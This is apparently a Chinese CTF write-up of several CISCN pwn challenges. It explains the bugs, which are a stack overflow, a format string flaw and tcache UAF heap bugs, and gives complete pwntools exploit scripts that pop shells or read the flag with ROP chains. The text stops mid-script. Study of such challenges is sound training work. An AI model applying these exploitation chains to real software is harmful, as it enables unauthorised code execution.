init()&#123;  setvbuf(stdin, 0, 2, 0);  return setvbuf(stdout, 0, 2, 0);&#125;\n\nvul函数相当于主函数 分析一下\nint vul()&#123;  char s[40]; // [esp+0h] [ebp-28h] BYREF  memset(s, 0, 0x20u);  read(0, s, 0x30u);  printf(&quot;Hello, %s\\n&quot;, s);  read(0, s, 0x30u);  return printf(&quot;Hello, %s\\n&quot;, s);&#125;\n\n给了两次read的机会 rsi都是栈上的s 同时输入完了以后还进行了printf操作\n没有开启canary和pie 存在栈溢出 栈溢出只有两个字长的距离 只够覆盖ebp和ret addr\n猜测一手栈迁移 但是目前没有bss段的地址可写 也没有给栈上的地址 既然这样那我们就自己泄露吧\ngdb动调一下  断点打在printf函数调用的时候\n\n这里我选择的是ebp处存放的栈地址\nprintf函数遇到\\0就会截停 所以我们只需要用垃圾数据覆盖esp到ebp之间的空间 就可以让printf函数一路畅通无阻 泄露出其内容\nfrom pwn import*from LibcSearcher import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28294)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Welcome, my friend. What&#x27;s your name?&quot;)payload = cyclic(0x28)io.send(payload)stack_addr = u32(io.recvuntil(&quot;\\xff&quot;)[-4:])success(&quot;stack_addr :&quot;+hex(stack_addr))\n\n随后就是栈迁移的部分了 gdb动调看一下我们第二次输入的s字符串的起始地址和泄露出来的栈地址偏移是多少 顺便在计算一下我们手动放入的binsh字符串的地址 最后利用题目已经给过的system函数构造rop链 获取shell\n完整exp:\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28294)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Welcome, my friend. What&#x27;s your name?&quot;)payload = cyclic(0x28)io.send(payload)stack_addr = u32(io.recvuntil(&quot;\\xff&quot;)[-4:])success(&quot;stack_addr :&quot;+hex(stack_addr))system_addr = 0x8048400s_addr = stack_addr - (0xff976728-0xff9766f0)binsh_addr = s_addr + 0xcleave_addr = 0x080484b8payload = p32(system_addr)+p32(0)+p32(binsh_addr)+b&#x27;/bin/sh;&#x27;payload = payload.ljust(0x28)+p32(s_addr-0x4)+p32(leave_addr)# gdb.attach(io,&#x27;b *0x80485FE&#x27;)# pause(0)io.send(payload)io.interactive()\n\n[CISCN 2019西南]PWN1解析放到栈分类的手写格式化字符串漏洞中了 下面直接放exp\nfrom pwn import*from LibcSearcher import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28417)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()fini_addr = 0x804979Cmain_addr = 0x8048534printf_got = 0x804989csystem_addr = 0x80483d0io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;%&#x27;+str(0x0804).encode()+b&#x27;c%15$hn&#x27;payload += b&#x27;%16$hn&#x27;payload += b&#x27;%&#x27;+str(0x83d0-0x0804).encode()+b&#x27;c%17$hn&#x27;payload += b&#x27;%&#x27;+str(0x8534-0x83d0).encode()+b&#x27;c%18$hnaa&#x27;payload += p32(fini_addr+2)payload += p32(printf_got+2)payload += p32(printf_got)payload += p32(fini_addr)print(len(payload))io.sendline(payload)io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;/bin/sh&#x27;io.sendline(payload)io.interactive()\n\n[CISCN 2021 初赛]silverwolf这题不是很难 但是难点在于多个知识点的结合\n在复现的时候也是学习到了许多新知识 下面详细复现一遍\n\n保护全开  同时libc文件是比较少见的2.27 1.3的小版本 这个版本也和目前最新的1.6版本一样  对于tcache有了新的检查机制\nida看一下几个函数\nvoid __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 v3[5]; // [rsp+0h] [rbp-28h] BYREF  v3[1] = __readfsqword(0x28u);  sub_C70();  while ( 1 )  &#123;    puts(&quot;1. allocate&quot;);    puts(&quot;2. edit&quot;);    puts(&quot;3. show&quot;);    puts(&quot;4. delete&quot;);    puts(&quot;5. exit&quot;);    __printf_chk(1LL, &quot;Your choice: &quot;);    __isoc99_scanf(&amp;unk_1144, v3);    switch ( v3[0] )    &#123;      case 1LL:        add();        break;      case 2LL:        edit();        break;      case 3LL:        show();        break;      case 4LL:        delete();        break;      case 5LL:        exit(0);      default:        puts(&quot;Unknown&quot;);        break;    &#125;  &#125;&#125;\n\n乍看一下漏洞给的挺多 好像是很简单的堆模板题\n\n但是还开启了沙盒 那显然是无法获取shell了 那就只能想办法构造rop链 \n同时仔细观察一下 你还会发现 其用来存储chunk指针的不是数组而是单子长的一个指针 这就意味着我们只能操控最新申请的一个chunk\n我们拥有的漏洞点包含 UAF off_by_null\n既然给了show函数 那么这时候想要泄露基址 还是通过Unsortedbin 不过由于对于申请chunk大小的限制 同时还有指针问题 所以这里要想把chunk丢到unsortedbin中只能通过篡改tcache_perthread_struct来实现目的了 \n另外 还有一个问题 由于开启了沙盒 沙盒的调用本身也是需要内存空间的 所以程序会自带一些chunk\n\n不过这些chunk对于我们的利用不会起到太大的影响 在做题的过程中小心一下即可\n为了劫持tcache_perthread_struct 我们首要的目的就是泄露堆地址 \n既然有UAF 那么我这里选择的办法是double free 然后泄露fd的值 计算堆基址\nadd(0,0x28)delete(0)edit(0,p64(0)*2)delete(0)add(0,0x28)show(0)heap_addr = (u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;)) &gt;&gt; 12) * (0x1000)-0x1000success(&quot;heap_addr :&quot;+hex(heap_addr))\n\n接下来顺带利用好这个double free 来申请到tcache_perthread_struct的地址 然后更改一下counts数组 \nedit(0,p64(heap_addr+0x10))add(0,0x28)add(0,0x28)edit(0,p64(0)*4+p64(0x7000000))\n\n这里的*p64(0)4+p64(0x7000000))  我还是提一嘴\n这样修改counts 你会发现被改为7的是0x250链表的位置\n\n之所以是0x250 是因为实际上此时的指针指向的chunk 虽然我们是通过0x28申请到的chunk 但是chunk头的0x251并没有被改写\n接下来就是释放chunk进unsortedbin 随后获得一些下面要用到的地址\ndelete(0)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f98511ebca0-0x7f9850e00000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]setcontext = libc_addr + libc.sym[&#x27;setcontext&#x27;] + 53\n\nsetcontext就是我们接下来要构造orw的关键好戏了 \n你可以在libc文件中找到这一函数\n\n可以看到函数对各种寄存器的值都进行了操作 并且还有一次push rcx的入栈操作 特别是\n.text:00000000000521B5                 mov     rsp, [rdi+0A0h]\n\n对于rsp寄存器的劫持可以使得我们在堆上构造rop链 随后迁移过去 因为其赋值是根据rdi来的\nrdi寄存器的值要怎么由我们操控呢? 当然是free函数了 \n进行一个小实验 编写如下程序\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;int main()&#123;  char *a[50];  *a = malloc(0x20);  free(*a);  puts(&quot;test&quot;);&#125;\n\n\n可以看到此时执行free函数时 rdi寄存器指向的就是chunk的地址\n控制rdi寄存器的办法有了 接下来来安排下tcache_perthread_struct的布置问题 我们需要修改entry数组 来得到多次任意地址申请的机会\n在开始布置之前 我们需要先获得能修改到其的机会 由于我们最开始使用的是0x28字节的chunk 显然是不够修改到entry数组的长度 \n我们挑选一个还没有存放chunk的tcachebin链表 会向unsortedbin中申请 所以此时申请到的地址还是tcache_perthread_struct中\nadd(0,0x48)edit(0,p64(0)*8+p64(heap_addr+0x50))\n\n于是我们获得了修改entry数组的机会 我们将0x20链表的修改为heap_addr+0x50 这个地址指向的就是entry数组的首地址\n随后我们利用这个机会 修改0x40链表的entry 这样就可以修改到更大链表的机会\nadd(0,0x18)edit(0,p64(0)*2+p64(heap_addr+0x50))\n\nadd(0,0x38)payload = p64(free_hook)+p64(heap_addr+0x1000)+p64(heap_addr+0x1000+0xa0)   #0x20 0x30 0x40payload += p64(heap_addr+0x1000)+p64(heap_addr+0x2000)+p64(0)+p64(heap_addr+0x2000+0x58) #0x50 0x60 0x70 0x80edit(0,payload)\n\n这里的entry构造就要详细讲讲了\n我们需要把rop链写到堆上 不过由于对申请堆块的限制 所以就只能分两次写 对应着0x60和0x80的链表\n0x20的链表则用来修改free_hook 使其指向setcontext+53的地址\n0x30和0x40的链表我们要用来配合劫持rsp指针 使其迁移到堆上的rop链\n0x50的链表则是用来触发free 充当rdi寄存器值\n0x70没有作用\nret_addr = libc_addr + 0x00000000000008aardi_addr = libc_addr + 0x000000000002164frsi_addr = libc_addr + 0x0000000000023a6ardx_addr = libc_addr + 0x0000000000001b96rax_addr = libc_addr + 0x000000000001b500syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5# ret_addr = libc_addr + 0x0000000000023eeb# rdi_addr = libc_addr + 0x00000000000215bf# rsi_addr = libc_addr + 0x0000000000023eea# rdx_addr = libc_addr + 0x0000000000001b96# rax_addr = libc_addr + 0x0000000000043ae8# syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5add(0,0x18)#修改free_hookedit(0,p64(setcontext))add(0,0x28)#设置rdi 顺便用来放./flag字符串edit(0,b&#x27;./flag\\x00\\x00&#x27;)add(0,0x38)#劫持rsp指针edit(0,p64(heap_addr+0x2000)+p64(ret_addr))\n\n劫持rsp指针的payload这里就不解释了 可以看我相关博客\n#openflag_addr = heap_addr + 0x1000rop_open = p64(rdi_addr)+p64(flag_addr)rop_open += p64(rsi_addr)+p64(0)rop_open += p64(rax_addr)+p64(2)rop_open += p64(syscall)#readrop_read = p64(rdi_addr)+p64(3)rop_read += p64(rsi_addr)+p64(flag_addr)rop_read += p64(rdx_addr)+p64(0x30)rop_read += p64(rax_addr)+p64(0)rop_read += p64(syscall)#writerop_write = p64(rdi_addr)+p64(1)rop_write += p64(rsi_addr)+p64(flag_addr)rop_write += p64(rdx_addr)+p64(0x30)rop_write += p64(rax_addr)+p64(1)rop_write += p64(syscall)payload = rop_open+rop_read+rop_writeadd(0,0x58) #布置rop链edit(0,payload[:0x58])add(0,0x78) #布置rop链edit(0,payload[0x58:])\n\n接着就是布置rop链了 分两次部署 [:0x58]和[0x58:]就是取前后0x58字节的部分 这个python语法问题 没啥好说的\n最后就是释放0x50链表的chunk了 成功获取flag\nadd(0,0x48)# gdb.attach(io,&#x27;b *&#x27;+str(heap_addr+0x2000))# pause(0)delete(0)io.recv()\n\n完整exp:\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28068)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add(index,size):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Done!&quot;)def edit(index,content):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def show(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def delete(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0x28)delete(0)edit(0,p64(0)*2)delete(0)add(0,0x28)show(0)heap_addr = (u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;)) &gt;&gt; 12) * (0x1000)-0x1000success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,p64(heap_addr+0x10))add(0,0x28)add(0,0x28)edit(0,p64(0)*4+p64(0x7000000))delete(0)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f98511ebca0-0x7f9850e00000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]setcontext = libc_addr + libc.sym[&#x27;setcontext&#x27;] + 53add(0,0x48)edit(0,p64(0)*8+p64(heap_addr+0x50))add(0,0x18)edit(0,p64(0)*2+p64(heap_addr+0x50))add(0,0x38)payload = p64(free_hook)+p64(heap_addr+0x1000)+p64(heap_addr+0x1000+0xa0)   #0x20 0x30 0x40payload += p64(heap_addr+0x1000)+p64(heap_addr+0x2000)+p64(0)+p64(heap_addr+0x2000+0x58) #0x50 0x60 0x70 0x80edit(0,payload)ret_addr = libc_addr + 0x00000000000008aardi_addr = libc_addr + 0x000000000002164frsi_addr = libc_addr + 0x0000000000023a6ardx_addr = libc_addr + 0x0000000000001b96rax_addr = libc_addr + 0x000000000001b500syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5# ret_addr = libc_addr + 0x0000000000023eeb# rdi_addr = libc_addr + 0x00000000000215bf# rsi_addr = libc_addr + 0x0000000000023eea# rdx_addr = libc_addr + 0x0000000000001b96# rax_addr = libc_addr + 0x0000000000043ae8# syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5add(0,0x18)#修改free_hookedit(0,p64(setcontext))add(0,0x28)#设置rdi 顺便用来放./flag字符串edit(0,b&#x27;./flag\\x00\\x00&#x27;)add(0,0x38)#劫持rsp指针edit(0,p64(heap_addr+0x2000)+p64(ret_addr))#openflag_addr = heap_addr + 0x1000rop_open = p64(rdi_addr)+p64(flag_addr)rop_open += p64(rsi_addr)+p64(0)rop_open += p64(rax_addr)+p64(2)rop_open += p64(syscall)#readrop_read = p64(rdi_addr)+p64(3)rop_read += p64(rsi_addr)+p64(flag_addr)rop_read += p64(rdx_addr)+p64(0x30)rop_read += p64(rax_addr)+p64(0)rop_read += p64(syscall)#writerop_write = p64(rdi_addr)+p64(1)rop_write += p64(rsi_addr)+p64(flag_addr)rop_write += p64(rdx_addr)+p64(0x30)rop_write += p64(rax_addr)+p64(1)rop_write += p64(syscall)payload = rop_open+rop_read+rop_writeadd(0,0x58) #布置rop链edit(0,payload[:0x58])add(0,0x78) #布置rop链edit(0,payload[0x58:])add(0,0x48)# gdb.attach(io,&#x27;b *&#x27;+str(heap_addr+0x2000))# pause(0)delete(0)io.recv()\n\n[CISCN 2021 初赛]lonelywolf比上面那一题更加简单 因为没有了沙盒限制 手法一模一样 就直接放exp了 唯一的麻烦是打不通远程 因为远程是2.27 1.4的版本 搞不到\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add(index,size):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Done!&quot;)def edit(index,content):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def show(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def delete(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0x70)delete(0)edit(0,p64(0)*2)delete(0)show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x260success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,p64(heap_addr+0x10))add(0,0x70)add(0,0x70)payload = p64(0)*4+p64(0x7000000)edit(0,payload)delete(0)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f85379ebca0-0x7f8537600000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]add(0,0x60)payload = p64(0)*8+p64(free_hook)edit(0,payload)add(0,0x10)edit(0,p64(system_addr))add(0,0x20)edit(0,b&#x27;/bin/sh\\x00&#x27;)delete(0)io.interactive()\n\n[CISCN 2022 华东北]bigduck通过这题学到了很多新东西 先来看一下保护机制吧\n\n这一道题是libc2.33的环境 并且开启了沙盒\n\n接着ida分析一下程序\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int v3; // [rsp+Ch] [rbp-4h]  init_sandbox();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu(a1, a2);      v3 = ((&amp;sub_1268 + 1))();      if ( v3 != 4 )        break;      edit();    &#125;    if ( v3 &gt; 4 )    &#123;LABEL_13:      a1 = &quot;Invalid choice&quot;;      puts(&quot;Invalid choice&quot;);    &#125;    else if ( v3 == 3 )    &#123;      show();    &#125;    else    &#123;      if ( v3 &gt; 3 )        goto LABEL_13;      if ( v3 == 1 )      &#123;        add();      &#125;      else      &#123;        if ( v3 != 2 )          goto LABEL_13;        delete();      &#125;    &#125;  &#125;&#125;\n\n标准的菜单题 函数给的挺全 没有堆溢出 但是有UAF 值得注意的是 add函数只能申请0x100大小的chunk\n既然给了打印堆块内容的机会 那么这里想的是通过unsortebin来泄露libc基址 不过由于只能申请0x100的chunk 那就通过填满tcache链表的办法\nfor i in range(7):    add()add()#7add()#8for i in range(7):    delete(i)delete(7)\n\n成功将chunk7释放进unsortedbin\n\nedit(7,1,b&#x27;\\x01&#x27;)show(7)io.recv()main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))edit(7,1,b&#x27;\\x00&#x27;)\n\n接下来就是把main_arena_addr打印出来了 唯一一点需要注意的就是该libc版本main_arena_addr + 96末位是\\x00 所以printf函数无法将其打印出来 需要我们修改一下末尾的值 最后再减去\n接下来 由于高版本多了一个tcache链表的fd异或保护机制 所以还需要泄露堆基址 这个也比较简单 直接打印处链表尾的chunk0就好了\nshow(0)io.recv()key = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))heap_addr = key &lt;&lt; 12success(&quot;heap_addr :&quot;+hex(heap_addr))\n\n接下来 我们就需要想办法获取flag了 由于开启了沙盒 所以没有办法通过简单的通过hook函数来获取shell\n之前的题目做过通过setcontext来劫持rsp指针 迁移到我们在堆上布置的rop链 不过由于2.33 其从rdi寻址改成了rcx寻址 给利用带来了不少难度 所以这里只能作废了\n这里使用我们做栈题的老办法了 覆盖ret addr\n那么获取到栈地址是一个关键的问题 这里可以使用environ指针\n\n我们跟进一下其存储的栈地址\n\n可以看到低地址处是一个栈帧 我们可以覆盖这个栈帧的ret addr\n至于这个是谁的栈帧呢 我编写了一个小程序来动调查验\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;void test1()&#123;  puts(&quot;test1&quot;);&#125;void test2()&#123;  puts(&quot;test2&quot;);&#125;int main()&#123;  test1();  test2();  test1();&#125;\n\n经过测试 不论是跟进到test函数中 还是在main函数中 environ索引到的都是栈帧高地址处的一块内存\n覆盖的ret addr实际上是使得任何函数的返回地址都为止修改(待考证 目前可以确定的是哪怕read函数的返回地址也是受到这个影响的 等我有空更深入了解一下堆栈结构吧 感觉这方面的理解还是不清楚)\n经过计算 我们得到了ret addr的地址 接下里只要利用tcachebin attack任意写修改其值就可以了\nfor i in range(5):    add()  #9-13edit(1,8,p64(environ_addr ^ key))add()#14add()#15edit(0,8,b&#x27;./flag\\x00\\x00&#x27;)show(15)io.recv()stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x138success(&quot;stack_addr :&quot;+hex(stack_addr))\n\n我们先将tcache清空一下 取出大部分chunk 就留下两个留着攻击\n随后申请到environ处 利用show函数打印处栈地址\ndelete(9)delete(10)edit(10,8,p64(stack_addr^key))add()#16add()#17rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x00000000000c7f32# rax_addr = libc_addr + 0x0000000000044c70# syscall = libc_addr + 0x0000000000026858open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]#open#flag_addr = stack_addr +0x10flag_addr = heap_addr + 0x2a0payload = p64(0)*3+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(write_addr)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# gdb.attach(io,&#x27;b *$rebase(0x14AD)&#x27;)# pause(0)edit(17,len(payload),payload)io.recv()io.recv()debug()\n\n接下来任意写到ret addr不远处 这里准确的应该是stack_addr - 0x128 但是好像不能直接申请到这里 估计是malloc检查之类的锅 有待考究 至于申请到stack_addr - 0x138的话 覆盖到了canary 但是不会触发报错 是因为压根没检查 可能是出题人通过什么办法去掉了吧\n\n完整exp:\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add():    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Done&quot;)def delete(index):    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Idx: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Idx: &quot;)    io.sendline(str(index))def edit(index,size,content):    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Idx: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)for i in range(7):    add()add()#7add()#8for i in range(7):    delete(i)delete(7)edit(7,1,b&#x27;\\x01&#x27;)show(7)io.recv()main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))edit(7,1,b&#x27;\\x00&#x27;)show(0)io.recv()key = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))heap_addr = key &lt;&lt; 12success(&quot;heap_addr :&quot;+hex(heap_addr))environ_addr = libc_addr + libc.sym[&#x27;environ&#x27;]for i in range(5):    add()  #9-13edit(1,8,p64(environ_addr ^ key))add()#14add()#15edit(0,8,b&#x27;./flag\\x00\\x00&#x27;)show(15)io.recv()stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x138success(&quot;stack_addr :&quot;+hex(stack_addr))delete(9)delete(10)edit(10,8,p64(stack_addr^key))add()#16add()#17rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x00000000000c7f32# rax_addr = libc_addr + 0x0000000000044c70# syscall = libc_addr + 0x0000000000026858open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]#open#flag_addr = stack_addr +0x10flag_addr = heap_addr + 0x2a0payload = p64(0)*3+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(write_addr)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# gdb.attach(io,&#x27;b *$rebase(0x14AD)&#x27;)# pause(0)edit(17,len(payload),payload)io.recv()io.recv()debug()\n\n另外关于最后的劫持程序执行流 还有一种办法 我们之前不是提到过 可以确定的是read函数的栈帧也是在那一块吗 可以劫持read函数执行完后的程序执行流 并且由于我们没有破坏原本的栈结构 所以程序执行完 还是可以正常返回的\n我们将任意写的地址改为stack_addr - 0x168 然后s到read函数中的syscall来看一看\n\n可以看到 如果我们在rop链前添上8字节的垃圾数据的话 在执行完read后 rsp指针指向的刚好就是rop链的首地址 这时候执行ret指令 就劫持了程序执行流\n另外一种exp:\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add():    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Done&quot;)def delete(index):    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Idx: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Idx: &quot;)    io.sendline(str(index))def edit(index,size,content):    io.recvuntil(&quot;Choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Idx: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)for i in range(7):    add()add()#7add()#8for i in range(7):    delete(i)delete(7)edit(7,1,b&#x27;\\x01&#x27;)show(7)io.recv()main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))edit(7,1,b&#x27;\\x00&#x27;)show(0)io.recv()key = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))heap_addr = key &lt;&lt; 12success(&quot;heap_addr :&quot;+hex(heap_addr))environ_addr = libc_addr + libc.sym[&#x27;environ&#x27;]for i in range(5):    add()  #9-13edit(1,8,p64(environ_addr ^ key))add()#14add()#15edit(0,8,b&#x27;./flag\\x00\\x00&#x27;)show(15)io.recv()stack_addr = 